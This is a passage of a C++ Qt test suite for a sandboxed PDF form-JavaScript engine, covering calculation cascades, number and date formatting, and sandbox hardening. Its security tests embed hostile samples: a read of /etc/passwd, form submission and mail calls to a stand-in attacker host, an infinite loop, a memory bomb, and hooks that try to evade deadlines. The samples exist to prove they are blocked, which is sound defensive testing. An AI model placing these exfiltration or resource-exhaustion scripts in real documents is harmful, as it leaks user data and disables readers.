// SPDX-License-Identifier: Apache-2.0
// Phase-1 form-JS (run-side AcroForm Calculate/Format) regression suite.
//
// Contract under test (docs/research/form-js-implementation-plan.md §3/§4):
//   * the /AA /C cascade runs INSIDE the R01 transaction: the user's value
//     and every recalculated /V persist as ONE atomic commit;
//   * Format (/AA /F) is display-only — /V is never rewritten;
//   * every script failure is honest: field-attributed kind + reason, the
//     field keeps its committed value, the user value still saves;
//   * the sandbox has a 16 MiB memory cap, a hard interrupt deadline and NO
//     host-I/O capability; egress verbs (submitForm/mailDoc/...) are recorded,
//     never executed;
//   * cyclic /CO terminates (each field calculated at most once per cascade);
//   * keyboard TAB order (page /Annots + /Tabs /W) and CALCULATION order (the
//     AcroForm /CO array) are separate concepts — a tab-order edit never
//     rewrites /CO, and the cascade still computes in the author's /CO order
//     (R18(b));
//   * an aborted cascade's runtime is DISCARDED — no hostile global state
//     bleeds into the next operation (R18(d)).
//
// Golden values for the AF shim were pinned against the ported pdf.js
// reference running under quickjs-ng 0.15.0 (qjs), 2026-09-09.
//
// Revert-verify: with execution globally disabled (the pre-fix disclosure
// state) the cascade tests FAIL — `revertVerifyDisabledExecutionIsPreFixState`
// proves the suite detects that regression direction. The R05/JS-01
// whole-operation-deadline tests have their own revert direction: against the
// pre-fix sources (deadline armed only around the single script eval) the
// bypass tests HANG and fail under the harness timeout.
#include <QtTest/QtTest>
#include <QTemporaryDir>
#include <QFile>
#include <QDir>
#include <QCryptographicHash>
#include <QPdfWriter>
#include <QPainter>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QElapsedTimer>

#include <podofo/podofo.h>
#include "core/Capability.h"
#include "engines/FormManager.h"
#include "engines/qpdf/QpdfBackend.h"
#include "engines/formjs/FormJsSandbox.h"
#include "engines/formjs/FormJsRunner.h"

#include <map>

#ifdef GetObject
#undef GetObject
#endif

using gp::formjs::FormJsSandbox;
using gp::formjs::FormJsRunner;
using gp::formjs::CascadeReport;
using gp::formjs::FieldJsFailure;

namespace {

struct FieldSpec {
    QString name;
    QString calcScript;   // /AA /C body (may be empty)
    QString formatScript; // /AA /F body (may be empty)
    QString initial;      // initial /V (may be empty)
};

QString fieldValueOf(const PoDoFo::PdfField& field)
{
    const PoDoFo::PdfDictionary& dict = (field.GetObject)().GetDictionary();
    if (const PoDoFo::PdfObject* v = dict.FindKey("V"); v && v->IsString())
        return QString::fromUtf8(v->GetString().GetString().data(),
                                 static_cast<qsizetype>(v->GetString().GetString().size()));
    return {};
}

// Field name for an object reference (merged field/widget or /Kids widget);
// empty when the reference is not a known field (non-widget annotation).
QString fieldNameByRef(const PoDoFo::PdfMemDocument& doc, const PoDoFo::PdfReference& ref)
{
    auto* acroForm = doc.GetAcroForm();
    if (!acroForm) return {};
    for (unsigned i = 0; i < acroForm->GetFieldCount(); ++i) {
        auto& f = acroForm->GetFieldAt(i);
        if ((f.GetObject)().GetIndirectReference() == ref)
            return QString::fromStdString(f.GetFullName());
        if (const PoDoFo::PdfObject* kids = f.GetDictionary().FindKey("Kids");
            kids && kids->IsArray()) {
            for (const auto& kid : kids->GetArray())
                if (kid.IsReference() && kid.GetReference() == ref)
                    return QString::fromStdString(f.GetFullName());
        }
    }
    return {};
}

// The AcroForm /CO calculation order as a FIELD-NAME sequence on disk.
QStringList coNameSequenceOf(const QString& path)
{
    QStringList names;
    try {
        PoDoFo::PdfMemDocument doc;
        doc.Load(path.toUtf8().constData());
        auto* acroForm = doc.GetAcroForm();
        if (!acroForm) return names;
        const PoDoFo::PdfObject* co = acroForm->GetDictionary().FindKey("CO");
        if (!co || !co->IsArray()) return names;
        for (const auto& item : co->GetArray()) {
            if (!item.IsReference()) { names << QStringLiteral("<direct>"); continue; }
            const QString n = fieldNameByRef(doc, item.GetReference());
            names << (n.isEmpty() ? QStringLiteral("<dangling>") : n);
        }
    } catch (const PoDoFo::PdfError&) {}
    return names;
}

// Page 0's widget-annotation order as field names ("<nonfield>" for every
// annotation that is not a known form widget) — the keyboard tab order.
QStringList page0AnnotNameSequence(const QString& path)
{
    QStringList names;
    try {
        PoDoFo::PdfMemDocument doc;
        doc.Load(path.toUtf8().constData());
        const PoDoFo::PdfObject* annots = doc.GetPages().GetPageAt(0).GetDictionary().FindKey("Annots");
        if (!annots || !annots->IsArray()) return names;
        for (const auto& item : annots->GetArray()) {
            if (!item.IsReference()) { names << QStringLiteral("<direct>"); continue; }
            const QString n = fieldNameByRef(doc, item.GetReference());
            names << (n.isEmpty() ? QStringLiteral("<nonfield>") : n);
        }
    } catch (const PoDoFo::PdfError&) {}
    return names;
}

// Page 0's /Tabs declaration ("" when absent).
QString page0TabsValue(const QString& path)
{
    try {
        PoDoFo::PdfMemDocument doc;
        doc.Load(path.toUtf8().constData());
        const PoDoFo::PdfObject* tabs = doc.GetPages().GetPageAt(0).GetDictionary().FindKey("Tabs");
        if (tabs && tabs->IsName())
            return QString::fromLatin1(tabs->GetName().GetString().data(),
                                       qsizetype(tabs->GetName().GetString().size()));
    } catch (const PoDoFo::PdfError&) {}
    return {};
}

// Replaces the page-0 /Tabs declaration (fixture helper for author-declared
// tab orders). Saves to `out` (a NEW path — never same-file).
QString withTabsDeclaration(const QString& src, const QString& out, const char* tabs)
{
    try {
        PoDoFo::PdfMemDocument doc;
        doc.Load(src.toUtf8().constData());
        doc.GetPages().GetPageAt(0).GetDictionary().AddKey(PoDoFo::PdfName("Tabs"),
                                                           PoDoFo::PdfName(tabs));
        doc.Save(out.toUtf8().constData());
    } catch (const PoDoFo::PdfError& e) {
        qWarning() << "withTabsDeclaration fixture failed:" << e.what();
        return {};
    }
    return out;
}

QString sha256OfFile(const QString& path)
{
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly)) return {};
    QCryptographicHash hash(QCryptographicHash::Sha256);
    char buf[65536];
    while (true) {
        const qint64 n = f.read(buf, sizeof(buf));
        if (n <= 0) break;
        hash.addData(QByteArrayView(buf, int(n)));
    }
    return QString::fromLatin1(hash.result().toHex());
}

} // namespace

class TestFormJsCalc : public QObject {
    Q_OBJECT
private:
    QTemporaryDir m_dir;

    // ── Fixtures ─────────────────────────────────────────────────────────────

    static QString makeBasePdf(const QString& dir, const QString& name) {
        const QString path = dir + "/" + name;
        QPdfWriter writer(path);
        writer.setPageSize(QPageSize(QPageSize::A4));
        writer.setResolution(72);
        QPainter p(&writer);
        p.drawText(80, 100, QStringLiteral("Form-JS fixture"));
        p.end();
        return path;
    }

    // Builds a form PDF with the given fields + a /CO array written exactly in
    // `coOrder` (duplicates preserved — fixtures must be able to express the
    // malformed cyclic documents the cascade must survive). Direct save to a
    // NEW path only (never same-file — the R01 lesson applies to fixtures too).
    QString makeFormPdf(const QString& name, const QList<FieldSpec>& fields,
                        const QStringList& coOrder)
    {
        const QString base = makeBasePdf(m_dir.path(), name + "-base.pdf");
        const QString path = m_dir.path() + "/" + name;
        try {
            PoDoFo::PdfMemDocument doc;
            doc.Load(base.toUtf8().constData());
            PoDoFo::PdfPage& page = doc.GetPages().GetPageAt(0);

            std::map<QString, PoDoFo::PdfReference> refs;
            double y = 600;
            for (const FieldSpec& spec : fields) {
                const PoDoFo::Rect rect(100, y, 200, 16);
                auto& field = page.CreateField<PoDoFo::PdfTextBox>(spec.name.toStdString(), rect);
                auto* textBox = dynamic_cast<PoDoFo::PdfTextBox*>(&field);
                textBox->SetText(PoDoFo::PdfString(spec.initial.toStdString()));
                if (!spec.calcScript.isEmpty() || !spec.formatScript.isEmpty()) {
                    PoDoFo::PdfDictionary aa;
                    if (!spec.calcScript.isEmpty()) {
                        PoDoFo::PdfDictionary action;
                        action.AddKey(PoDoFo::PdfName("S"), PoDoFo::PdfName("JavaScript"));
                        action.AddKey(PoDoFo::PdfName("JS"), PoDoFo::PdfString(spec.calcScript.toStdString()));
                        aa.AddKey(PoDoFo::PdfName("C"), action);
                    }
                    if (!spec.formatScript.isEmpty()) {
                        PoDoFo::PdfDictionary action;
                        action.AddKey(PoDoFo::PdfName("S"), PoDoFo::PdfName("JavaScript"));
                        action.AddKey(PoDoFo::PdfName("JS"), PoDoFo::PdfString(spec.formatScript.toStdString()));
                        aa.AddKey(PoDoFo::PdfName("F"), action);
                    }
                    field.GetDictionary().AddKey(PoDoFo::PdfName("AA"), aa);
                }
                refs[spec.name] = (field.GetObject)().GetIndirectReference();
                y -= 40;
            }

            auto* acroForm = doc.GetAcroForm();
            if (!acroForm)
                qFatal("fixture: QPdfWriter PDF produced no AcroForm after CreateField");
            PoDoFo::PdfArray co;
            for (const QString& n : coOrder) {
                const auto it = refs.find(n);
                if (it != refs.end()) co.Add(it->second);
            }
            if (!co.IsEmpty())
                acroForm->GetDictionary().AddKey(PoDoFo::PdfName("CO"), co);

            doc.Save(path.toUtf8().constData());
        } catch (const PoDoFo::PdfError& e) {
            qWarning() << "fixture build failed:" << e.what();
            return {};
        }
        return path;
    }

    // The order form: two line items (PROD), one total (SUM), /CO order
    // line1 → line2 → total so the cascade's ORDERING is load-bearing.
    QString makeOrderForm(const QString& name)
    {
        return makeFormPdf(name,
        {
            { QStringLiteral("qty1"), {}, {}, {} },
            { QStringLiteral("price1"), {}, {}, {} },
            { QStringLiteral("qty2"), {}, {}, {} },
            { QStringLiteral("price2"), {}, {}, {} },
            { QStringLiteral("line1"),
              QStringLiteral("AFSimple_Calculate('PROD', new Array('qty1','price1'));"), {}, {} },
            { QStringLiteral("line2"),
              QStringLiteral("AFSimple_Calculate('PROD', new Array('qty2','price2'));"), {}, {} },
            { QStringLiteral("total"),
              QStringLiteral("AFSimple_Calculate('SUM', new Array('line1','line2'));"),
              QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"$\", true);"), {} },
        },
        { QStringLiteral("line1"), QStringLiteral("line2"), QStringLiteral("total") });
    }

    // ── Read paths ───────────────────────────────────────────────────────────

    // Path 1: fresh PoDoFo load (the engine's own serializer round-trip).
    static QString pdfFieldValue(const QString& path, const QString& name)
    {
        try {
            PoDoFo::PdfMemDocument doc;
            doc.Load(path.toUtf8().constData());
            auto* acroForm = doc.GetAcroForm();
            if (!acroForm) return {};
            for (unsigned i = 0; i < acroForm->GetFieldCount(); ++i) {
                auto& field = acroForm->GetFieldAt(i);
                if (QString::fromStdString(field.GetFullName()) == name)
                    return fieldValueOf(field);
            }
        } catch (const PoDoFo::PdfError& e) {
            qWarning() << "pdfFieldValue failed:" << e.what();
        }
        return {};
    }

    // Path 2: qpdf's independent parser (QpdfBackend::inspectJson) — the
    // persisted /V must be real PDF data readable by a second implementation.
    static QString qpdfFieldValue(const QString& path, const QString& name)
    {
        const QString json = QpdfBackend::inspectJson(path);
        if (json.isEmpty()) return {};
        const QJsonDocument doc = QJsonDocument::fromJson(json.toUtf8());
        return findFieldValue(doc.object(), name);
    }

    // qpdf's object-map JSON renders strings prefixed with their encoding
    // ("u:" = UTF-8 string); strip it.
    static QString qpdfString(const QJsonValue& v)
    {
        QString s = v.toString();
        if (s.startsWith(QLatin1String("u:"))) s.remove(0, 2);
        return s;
    }

    static QString findFieldValue(const QJsonObject& o, const QString& name)
    {
        // Field dicts carry /T (partial name) + /V; walk the whole object map
        // so field trees of any nesting resolve.
        if (qpdfString(o.value(QLatin1String("/T"))) == name)
            return qpdfString(o.value(QLatin1String("/V")));
        for (const auto& v : o) {
            if (v.isObject()) {
                const QString r = findFieldValue(v.toObject(), name);
                if (!r.isEmpty()) return r;
            } else if (v.isArray()) {
                for (const auto& item : v.toArray()) {
                    if (item.isObject()) {
                        const QString r = findFieldValue(item.toObject(), name);
                        if (!r.isEmpty()) return r;
                    }
                }
            }
        }
        return {};
    }

    static bool fillAndFill(const QString& path, const QVariantMap& data,
                            const QString& out, QList<FormJsFailure>* jsFailures = nullptr)
    {
        FormManager fm;
        return fm.fillForm(path, data, out, /*lockFields=*/false, nullptr, jsFailures);
    }

    static QStringList failureNames(const QList<FormJsFailure>& failures)
    {
        QStringList names;
        for (const auto& f : failures) names << f.fieldName;
        return names;
    }

    struct JsErrorKindKeeper { gp::formjs::JsEvalResult r; };
    static QString runFormat(const QString& script, const QString& value,
                             JsErrorKindKeeper* keep = nullptr)
    {
        FormJsSandbox sandbox;
        QString err;
        if (!sandbox.installShim(&err)) {
            qWarning() << "shim install failed:" << err;
            return QStringLiteral("<shim-failed>");
        }
        const auto r = sandbox.runEvent(script, QStringLiteral("golden"),
                                        QStringLiteral("Format"), value, 250);
        if (keep) keep->r = r;
        return r.ok ? (r.hasValue ? r.value : QString()) : QStringLiteral("<error:>") + r.message;
    }

private slots:
    void initTestCase()
    {
#ifndef HAS_QUICKJS
        QSKIP("This build was compiled without a JavaScript engine (disclosure state).");
#else
        QVERIFY(m_dir.isValid());
#endif
    }

    // ── Engine-level AF goldens (pinned against pdf.js reference on qjs) ─────

    void goldenNumberFormat();
    void goldenPercentAndParse();
    void goldenDateFormat();
    void goldenSimpleCalculateOps();

    // ── Sandbox security negatives ───────────────────────────────────────────

    void sandboxHasNoHostIoCapabilities();
    void sandboxBlocksEgressVerbsAndRecordsThem();
    void sandboxInfiniteLoopHitsDeadline();
    void sandboxMemoryBombRefused();
    void sandboxSyntaxErrorClassified();

    // ── R05/JS-01: the whole-operation deadline (reproduced blocker) ────────
    // Every engine entry — setup, script, exception inspection, end-event
    // collection, coercion/getter/toJSON hooks, snapshot refresh — must run
    // under ONE absolute deadline. Each test below was a REPRODUCED hang
    // (external harness kill) before the fix.

    void sandboxEndEventHelperLoopTerminates();       // reviewer bypass #1
    void sandboxEventValueGetterLoopTerminates();     // reviewer bypass #2
    void sandboxModifiedSetupHelperTerminates();      // begin-event eval gap
    void sandboxCoercionHookTerminates();             // String(v) → toString loop
    void sandboxSerializationHookTerminates();        // JSON.stringify → toJSON loop
    void sandboxProxyTrapLoopTerminates();            // Proxy get trap loop
    void sandboxExceptionGetterTerminates();          // thrown Error's name getter
    void sandboxHostTransferCapRefusesGiantResult();  // C++-side output cap
    void repeatedTimeoutsLeaveSandboxUsable();        // wedged-runtime negative
    void endEventTimeoutKeepsValueAndDisclosesSkipped(); // cascade transaction

    // ── Integration: the R01-transaction cascade ─────────────────────────────

    void orderFormCascadePersistsThroughSave();
    void cascadeRecomputesWhenLineItemChanges();
    void formatIsDisplayOnlyAndNeverWritesV();
    void syntaxErrorKeepsCommittedValueAndOthersCalculate();
    void infiniteLoopKeepsValueAndSaveProceeds();
    void cyclicCalculationOrderTerminates();
    void revertVerifyDisabledExecutionIsPreFixState();
    void capabilityRegistryDisclosesFormJavaScript();

    // ── R18(b): keyboard TAB order vs CALCULATION order ──────────────────────
    // The two orders are different PDF concepts (/Annots + /Tabs /W vs the
    // AcroForm /CO array) and must be pinned where they DIFFER.

    void tabOrderReordersWidgetsButNeverTouchesCalculationOrder();
    void tabOrderRespectsAuthorTabsDeclaration();
    void tabOrderWithNoMatchingFieldIsRefusedAndKeepsBytes();

    // ── R18(d): runtime closure after an aborted cascade ─────────────────────
    // A timed-out/aborted cascade's runtime is DISCARDED — no hostile global
    // state (a replaced end-event helper) may bleed into the next operation.

    void abortedCascadeDiscardsRuntimeNoStateBleedsIntoNextRun();
};

void TestFormJsCalc::goldenNumberFormat()
{
    // [script, input value, pinned reference output]
    const QList<QList<QString>> cases = {
        // US grouping, prepend: "1,234.50" family
        { QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"\", true);"), QStringLiteral("1234.5"), QStringLiteral("1,234.50") },
        { QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"\", true);"), QStringLiteral("-1234.5"), QStringLiteral("-1,234.50") },
        { QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"\", true);"), QStringLiteral("2.005"), QStringLiteral("2.00") },   // binary-representable rounding
        { QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"\", true);"), QStringLiteral("0.125"), QStringLiteral("0.13") },
        { QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"\", true);"), QStringLiteral("abc"), QString() },                  // non-number → ""
        { QStringLiteral("AFNumber_Format(0, 0, 0, 0, \"\", false);"), QStringLiteral("1234.5"), QStringLiteral("1,235") }, // 0 decimals
        // Currency suffix (sepStyle 1: no thousand sep, "." decimal — pdf.js printf table)
        { QStringLiteral("AFNumber_Format(2, 1, 0, 0, \"EUR \", false);"), QStringLiteral("1234.5"), QStringLiteral("1234.50EUR ") },
        // Parenthesized negative
        { QStringLiteral("AFNumber_Format(2, 0, 2, 0, \"\", false);"), QStringLiteral("-1234.5"), QStringLiteral("(1,234.50)") },
        // Red negative: the reference drops the sign and colors the text
        { QStringLiteral("AFNumber_Format(2, 0, 1, 0, \"\", false);"), QStringLiteral("-5"), QStringLiteral("5.00") },
    };
    for (const auto& c : cases) {
        JsErrorKindKeeper keep;
        const QString out = runFormat(c[0], c[1], &keep);
        QVERIFY2(keep.r.ok, qPrintable(QStringLiteral("script failed: %1").arg(keep.r.message)));
        QCOMPARE(out, c[2]);
    }
    // negStyle 1 colors the field proxy red (recorded, not rendered, in Phase 1)
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    (void)sandbox.runEvent(QStringLiteral("AFNumber_Format(2, 0, 1, 0, \"\", false);"),
                           QStringLiteral("neg"), QStringLiteral("Format"), QStringLiteral("-5"), 250);
    QString color;
    QVERIFY(sandbox.evalHelper(QStringLiteral("JSON.stringify(globalThis.event.target.textColor)"), &color, nullptr));
    QCOMPARE(color, QStringLiteral("[\"RGB\",1,0,0]"));
}

void TestFormJsCalc::goldenPercentAndParse()
{
    JsErrorKindKeeper keep;
    QCOMPARE(runFormat(QStringLiteral("AFPercent_Format(2, 0);"), QStringLiteral("0.125"), &keep), QStringLiteral("12.50%"));
    QCOMPARE(runFormat(QStringLiteral("AFPercent_Format(1, 0);"), QStringLiteral("2.005"), &keep), QStringLiteral("200.5%"));
    QCOMPARE(runFormat(QStringLiteral("AFPercent_Format(1, 0, true);"), QStringLiteral("0.125"), &keep), QStringLiteral("%12.5"));
    QCOMPARE(runFormat(QStringLiteral("AFPercent_Format(2, 0);"), QStringLiteral("junk"), &keep), QStringLiteral("%"));

    // AFNumber_Parse — authored from the Acrobat reference (pdf.js has no port);
    // sepStyle mapping equals the util.printf table the rest of the shim uses.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QString out, err;
    QVERIFY(sandbox.evalHelper(QStringLiteral("String(AFNumber_Parse(\"$1,234.56\", 0))"), &out, &err));
    QCOMPARE(out, QStringLiteral("1234.56"));
    QVERIFY(sandbox.evalHelper(QStringLiteral("String(AFNumber_Parse(\"(1.234,56)\", 2))"), &out, &err));
    QCOMPARE(out, QStringLiteral("-1234.56"));
    QVERIFY(sandbox.evalHelper(QStringLiteral("String(AFNumber_Parse(\"-$5\", 0))"), &out, &err));
    QCOMPARE(out, QStringLiteral("-5"));
    QVERIFY(sandbox.evalHelper(QStringLiteral("String(AFNumber_Parse(\"junk\", 0))"), &out, &err));
    QCOMPARE(out, QStringLiteral("null"));
}

void TestFormJsCalc::goldenDateFormat()
{
    JsErrorKindKeeper keep;
    // Identity round-trip through scand+printd of the same format
    QCOMPARE(runFormat(QStringLiteral("AFDate_FormatEx(\"yyyy-mm-dd\");"), QStringLiteral("2026-01-05"), &keep), QStringLiteral("2026-01-05"));
    // Reformat from a Date.parse()-able literal (US month-first convention)
    QCOMPARE(runFormat(QStringLiteral("AFDate_FormatEx(\"yyyy-mm-dd\");"), QStringLiteral("01/05/2026"), &keep), QStringLiteral("2026-01-05"));
    // m/d/yy of an ISO date
    QCOMPARE(runFormat(QStringLiteral("AFDate_FormatEx(\"m/d/yy\");"), QStringLiteral("2026-01-05"), &keep), QStringLiteral("1/5/26"));
    // Named-format table (AFDate_Format index 7 == "yy-mm-dd")
    QCOMPARE(runFormat(QStringLiteral("AFDate_Format(7);"), QStringLiteral("2026-01-05"), &keep), QStringLiteral("26-01-05"));
    // Unparseable input passes through untouched (pdf.js reference behavior)
    QCOMPARE(runFormat(QStringLiteral("AFDate_FormatEx(\"yyyy-mm-dd\");"), QStringLiteral("not a date"), &keep), QStringLiteral("not a date"));
    // Time formatting of a literal time string
    QCOMPARE(runFormat(QStringLiteral("AFTime_FormatEx(\"HH:MM\");"), QStringLiteral("14:30"), &keep), QStringLiteral("14:30"));
    // Clock seam: scand("")-style "now" resolution is pinnable → deterministic
    {
        FormJsSandbox sandbox;
        QVERIFY(sandbox.installShim(nullptr));
        QString out, err;
        const bool ok = sandbox.evalHelper(
            QStringLiteral("__gpSetFixedNowFromIso(\"2031-03-04T05:06:07\"); globalThis.__gpBeginEvent("
                           "{name:'n', value:'', eventKind:'Format'});"
                           "String(util.scand(\"yyyy-mm-dd\", \"\").getFullYear())"), &out, &err);
        QVERIFY2(ok, qPrintable(err));
        QCOMPARE(out, QStringLiteral("2031"));
    }
}

void TestFormJsCalc::goldenSimpleCalculateOps()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    sandbox.setFieldValues({
        { QStringLiteral("a"), QStringLiteral("2") },
        { QStringLiteral("b"), QStringLiteral("3.5") },
        { QStringLiteral("c"), QStringLiteral("4") },
        { QStringLiteral("empty"), QStringLiteral("") },
    });
    auto calc = [&sandbox](const char* args) {
        const auto r = sandbox.runEvent(
            QStringLiteral("AFSimple_Calculate(%1);").arg(QLatin1String(args)),
            QStringLiteral("calc"), QStringLiteral("Calculate"), QString(), 250);
        return r;
    };
    // [2, 3.5, 4]: SUM 9.5 · PROD 28 · AVG ~3.166667 (1e-6 rounding) · MIN 2 · MAX 4
    auto r = calc("'SUM', new Array('a','b','c')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("9.5"));
    r = calc("'PROD', new Array('a','b')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("7"));
    r = calc("'MAX', new Array('b','c')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("4"));
    r = calc("'AVG', new Array('a','c')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("3"));
    r = calc("'PRODUCT', new Array('a','b')"); // long Acrobat alias
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("7"));
    // Empty values count as 0; missing fields are skipped; empty list → 0
    r = calc("'SUM', new Array('empty')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("0"));
    r = calc("'SUM', new Array('nope')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("0"));
    r = calc("'SUM', new Array()");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("0"));
    // Exact float behavior: 0.1 + 0.2 must be exactly 0.3 (Math.sumPrecise)
    sandbox.setFieldValues({ { QStringLiteral("x"), QStringLiteral("0.1") },
                             { QStringLiteral("y"), QStringLiteral("0.2") } });
    r = calc("'SUM', new Array('x','y')");
    QVERIFY(r.ok); QCOMPARE(r.value, QStringLiteral("0.3"));
}

void TestFormJsCalc::sandboxHasNoHostIoCapabilities()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    // Every host-I/O name must be ABSENT (not stubbed) — the §3.1 rule. The
    // only globals are the ECMAScript intrinsics plus the AF shim.
    const auto r = sandbox.runEvent(QStringLiteral(
        "globalThis.event.value = ['readFile','readbuffer','print','console.log',"
        "'fetch','XMLHttpRequest','Socket','require','process','import',"
        "'scriptArgs','std','os'].map(n => typeof globalThis[n]).join('|');"),
        QStringLiteral("io"), QStringLiteral("Calculate"), QString(), 250);
    QVERIFY(r.ok);
    // 'import' is a reserved word → typeof throws normally; it is EXCLUDED via
    // the array above (the sandbox parses strict module syntax only as itself).
    QCOMPARE(r.value,
             QStringLiteral("undefined|undefined|undefined|undefined|undefined|undefined")
                 + QStringLiteral("|undefined|undefined|undefined|undefined|undefined|undefined|undefined"));
    // And an attempted call fails loudly with a ReferenceError — no capability.
    const auto fail = sandbox.runEvent(QStringLiteral("readFile('/etc/passwd');"),
                                       QStringLiteral("io2"), QStringLiteral("Calculate"), QString(), 250);
    QVERIFY(!fail.ok);
    QCOMPARE(fail.kind, gp::formjs::JsErrorKind::Exception);
    QVERIFY(fail.message.contains(QLatin1String("readFile")));
}

void TestFormJsCalc::sandboxBlocksEgressVerbsAndRecordsThem()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    const auto r = sandbox.runEvent(QStringLiteral(
        "doc.submitForm('http://attacker.example/collect');"
        "doc.mailDoc('attacker@example.net');"
        "doc.exportData();"
        "app.launchURL('http://attacker.example');"
        "app.mailme('x');"
        "app.execDialog({});"
        "app.media();"
        "globalThis.event.value = 'computed-anyway';"),
        QStringLiteral("egress"), QStringLiteral("Calculate"), QString(), 250);
    QVERIFY2(r.ok, qPrintable(r.message));
    QCOMPARE(r.value, QStringLiteral("computed-anyway")); // computation continues
    const QStringList& blocked = r.blocked;
    QVERIFY(blocked.contains(QStringLiteral("doc.submitForm")));
    QVERIFY(blocked.contains(QStringLiteral("doc.mailDoc")));
    QVERIFY(blocked.contains(QStringLiteral("doc.exportData")));
    QVERIFY(blocked.contains(QStringLiteral("app.launchURL")));
    QVERIFY(blocked.contains(QStringLiteral("app.mailme")));
    QVERIFY(blocked.contains(QStringLiteral("app.execDialog")));
    QVERIFY(blocked.contains(QStringLiteral("app.media")));
    QCOMPARE(blocked.size(), 7);
}

void TestFormJsCalc::sandboxInfiniteLoopHitsDeadline()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(QStringLiteral("while (true) {}"),
                                    QStringLiteral("spin"), QStringLiteral("Calculate"), QString(), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("interrupt took %1 ms").arg(elapsed)));
    QVERIFY(elapsed >= 100); // the deadline genuinely bound the run
}

void TestFormJsCalc::sandboxMemoryBombRefused()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    const auto r = sandbox.runEvent(QStringLiteral(
        "var a = []; while (true) { a.push(new Array(100000)); }"),
        QStringLiteral("bomb"), QStringLiteral("Calculate"), QString(), 250);
    QVERIFY2(!r.ok, "the memory bomb must fail");
    QVERIFY2(r.kind == gp::formjs::JsErrorKind::Memory || r.kind == gp::formjs::JsErrorKind::Timeout,
             qPrintable(QStringLiteral("kind=%1 message=%2")
                            .arg(int(r.kind)).arg(r.message)));
    QVERIFY2(r.message.size() > 0, "honest reason required");
}

void TestFormJsCalc::sandboxSyntaxErrorClassified()
{
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    const auto r = sandbox.runEvent(QStringLiteral("event.value = ;"),
                                    QStringLiteral("broken"), QStringLiteral("Calculate"), QString(), 250);
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Syntax);
}

// ── R05/JS-01: the whole-operation deadline ──────────────────────────────────
// Before the fix each of these was a reproduced infinite hang — the deadline
// was active only around the single script eval (deadlineMs = -1 everywhere
// else), so script-installed helpers/getters/hooks ran unbounded afterwards.

void TestFormJsCalc::sandboxEndEventHelperLoopTerminates()
{
    // Reviewer bypass #1: the script REPLACES globalThis.__gpEndEvent with an
    // infinite loop; the host's result-collection eval ran it with no deadline.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("globalThis.__gpEndEvent = function () { while (true) {} }; event.value = 42;"),
        QStringLiteral("hook"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY(r.message.contains(QLatin1String("event result collection")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("end-event hook took %1 ms").arg(elapsed)));
    // No value escaped the aborted operation — the caller must keep the /V.
    QVERIFY(!r.hasValue);
    QVERIFY(r.value.isEmpty());
}

void TestFormJsCalc::sandboxEventValueGetterLoopTerminates()
{
    // Reviewer bypass #2: a looping getter on event.value fires while the
    // end-event helper serializes the result.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("Object.defineProperty(event, 'value', { get() { while (true) {} } });"),
        QStringLiteral("getter"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("value getter took %1 ms").arg(elapsed)));
}

void TestFormJsCalc::sandboxModifiedSetupHelperTerminates()
{
    // The begin-event SETUP eval ran BEFORE the deadline was armed: an event
    // that replaces __gpBeginEvent with a loop hangs the NEXT event's setup.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    const auto poison = sandbox.runEvent(
        QStringLiteral("globalThis.__gpBeginEvent = function () { while (true) {} }; event.value = 42;"),
        QStringLiteral("setup"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    QVERIFY2(poison.ok, qPrintable(poison.message)); // the poison itself completes
    QElapsedTimer clock;
    clock.start();
    const auto next = sandbox.runEvent(QStringLiteral("event.value = 1;"),
                                       QStringLiteral("setup"), QStringLiteral("Calculate"),
                                       QStringLiteral("0"), 100);
